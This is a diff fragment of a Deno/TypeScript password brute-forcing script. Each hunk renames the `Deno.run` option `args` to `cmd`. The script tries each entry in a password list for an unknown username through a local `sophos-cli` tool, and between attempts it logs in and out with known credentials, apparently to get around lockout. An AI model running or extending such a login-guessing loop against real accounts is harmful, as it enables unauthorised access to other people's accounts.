@@ -57,7 +57,7 @@ const password_list: Array<string> = [
 
 console.log("LogIn Known: " + username_known + " : " + password_known + "\n");
 let p1 = Deno.run({
-  args: [
+  cmd: [
     "./sophos-cli",
     username_known,
     password_known,
@@ -72,7 +72,7 @@ console.log(
 
 console.log("LogOut Known " + username_known + " : " + password_known + "\n");
 let p2 = Deno.run({
-  args: [
+  cmd: [
     "./sophos-cli",
     username_known,
     password_known,
@@ -94,7 +94,7 @@ while (k < password_list.length) {
       "LogIn Known: " + username_known + " : " + password_known + "\n"
     );
     let p1 = Deno.run({
-      args: [
+      cmd: [
         "./sophos-cli",
         username_known,
         password_known,
@@ -111,7 +111,7 @@ while (k < password_list.length) {
       "LogOut Known " + username_known + " : " + password_known + "\n"
     );
     let p2 = Deno.run({
-      args: [
+      cmd: [
         "./sophos-cli",
         username_known,
         password_known,
@@ -129,7 +129,7 @@ while (k < password_list.length) {
       "Trying Unknown " + username_to_find + " : " + password_list[i] + "\n"
     );
     let p = Deno.run({
-      args: [
+      cmd: [
         "./sophos-cli",
         username_to_find,
         password_list[i],
